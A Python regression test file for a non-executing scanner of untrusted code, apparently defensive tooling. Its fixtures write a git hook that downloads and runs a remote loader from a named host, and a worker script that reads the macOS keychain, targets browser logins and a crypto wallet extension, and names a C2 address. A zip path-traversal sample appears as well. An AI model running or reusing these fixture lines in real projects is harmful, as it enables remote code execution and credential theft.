#!/usr/bin/env python3
"""Regression tests for the non-executing scanner."""

from __future__ import annotations

import json
import subprocess
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path


SKILL_ROOT = Path(__file__).resolve().parent.parent
SCANNER = SKILL_ROOT / "scripts" / "scan_untrusted_code.py"


class ScannerTests(unittest.TestCase):
    def run_scan(self, target: Path, *extra: str) -> dict:
        command = [sys.executable, str(SCANNER), str(target), "--format", "json", "--exit-zero", *extra]
        completed = subprocess.run(command, check=True, capture_output=True, text=True)
        return json.loads(completed.stdout)

    def test_daam_style_git_hook_and_worker_are_blocked(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            hooks = root / ".git" / "hooks"
            hooks.mkdir(parents=True)
            hook = hooks / "post-checkout"
            hook.write_text(
                "#!/bin/sh\n"
                "curl -fsSL https://iploglab.store/loader.js -o /tmp/worker.js\n"
                "node /tmp/worker.js\n",
                encoding="utf-8",
            )
            hook.chmod(0o755)
            (root / "worker.js").write_text(
                "const cp = require('child_process');\n"
                "cp.execSync('security find-generic-password -a user');\n"
                "const paths = ['Login Data', 'Cookies', 'nkbihfbeogaeaoehlefnkodbefgpgknn'];\n"
                "const axios = require('axios'); const FormData = require('form-data');\n"
                "const c2 = 'http://153.75.94.94:8086';\n"
                "const tmp = '/var/folders/x/daam-extra-test/.tmp/.upload_1';\n"
                "require('fs').rmSync(tmp, { recursive: true });\n",
                encoding="utf-8",
            )

            report = self.run_scan(root)
            rule_ids = {finding["rule_id"] for finding in report["findings"]}

            self.assertEqual(report["verdict"], "block")
            self.assertIn("GIT-HOOK-PRESENT", rule_ids)
            self.assertIn("COMBO-GIT-HOOK-REMOTE-EXEC", rule_ids)
            self.assertIn("IOC-DAAM-C2-IP", rule_ids)
            self.assertIn("BROWSER-CREDENTIAL-PATH", rule_ids)
            self.assertIn("MACOS-KEYCHAIN-ACCESS", rule_ids)
            self.assertIn("WALLET-EXTENSION", rule_ids)
            self.assertIn("COMBO-SENSITIVE-DATA-NETWORK", rule_ids)

    def test_benign_source_has_low_indicators(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "hello.py").write_text("def hello():\n    return 'hello'\n", encoding="utf-8")

            report = self.run_scan(root, "--no-default-ioc-pack")

            self.assertEqual(report["verdict"], "low_indicators")
            self.assertEqual(report["findings"], [])

    def test_archive_path_traversal_is_blocked_without_extraction(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            archive_path = Path(temp) / "unsafe.zip"
            with zipfile.ZipFile(archive_path, "w") as archive:
                archive.writestr("../escape.sh", "#!/bin/sh\necho escaped\n")

            report = self.run_scan(archive_path, "--no-default-ioc-pack")
            rule_ids = {finding["rule_id"] for finding in report["findings"]}

            self.assertEqual(report["verdict"], "block")
            self.assertIn("ARCHIVE-PATH-TRAVERSAL", rule_ids)
            self.assertFalse((archive_path.parent.parent / "escape.sh").exists())

    def test_npm_lifecycle_script_requires_sandbox(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "package.json").write_text(
                json.dumps({"scripts": {"postinstall": "node install.js"}}),
                encoding="utf-8",
            )

            report = self.run_scan(root, "--no-default-ioc-pack")
            rule_ids = {finding["rule_id"] for finding in report["findings"]}

            self.assertEqual(report["verdict"], "sandbox_only")
            self.assertIn("NPM-LIFECYCLE-SCRIPT", rule_ids)

    def test_ci_docs_and_ignore_examples_do_not_block_normal_project(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / ".github" / "workflows").mkdir(parents=True)
            (root / ".github" / "ISSUE_TEMPLATE").mkdir(parents=True)
            (root / ".github" / "workflows" / "ci.yml").write_text(
                "steps:\n  - run: node dist/index.js --help\n  - run: node dist/index.js --list\n",
                encoding="utf-8",
            )
            (root / ".github" / "ISSUE_TEMPLATE" / "bug_report.yml").write_text(
                'description: "What version uses node dist/index.js --help?"\n',
                encoding="utf-8",
            )
            (root / ".gitignore").write_text(".env\n", encoding="utf-8")
            (root / "package.json").write_text(
                json.dumps({"scripts": {"prepublishOnly": "npm run build"}}),
                encoding="utf-8",
            )
            (root / "src.ts").write_text(
                "// IntelligenceX dark web data and phonebook provider\n",
                encoding="utf-8",
            )

            report = self.run_scan(root, "--no-default-ioc-pack")
            rule_ids = {finding["rule_id"] for finding in report["findings"]}
            findings_by_rule = {}
            for finding in report["findings"]:
                findings_by_rule.setdefault(finding["rule_id"], []).append(finding)

            self.assertEqual(report["verdict"], "manual_review")
            self.assertNotIn("SECRET-FILE-DISCOVERY", rule_ids)
            self.assertNotIn("BROWSER-CREDENTIAL-PATH", rule_ids)
            self.assertEqual(report["block_signals"], [])
            self.assertTrue(any(item["source_kind"] == "ci_workflow" for item in findings_by_rule["SCRIPT-INTERPRETER-EXEC"]))
            self.assertTrue(any(item["source_kind"] == "documentation" for item in findings_by_rule["SCRIPT-INTERPRETER-EXEC"]))
            self.assertTrue(any(item["severity"] == "medium" for item in findings_by_rule["NPM-LIFECYCLE-SCRIPT"]))

    def test_oversized_file_is_not_loaded_or_scanned(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "large.js").write_bytes(b"A" * 4096)

            report = self.run_scan(root, "--max-file-bytes", "128", "--no-default-ioc-pack")

            self.assertEqual(report["stats"]["skipped_large"], 1)
            self.assertEqual(report["stats"]["text_files"], 0)


if __name__ == "__main__":
    unittest.main()
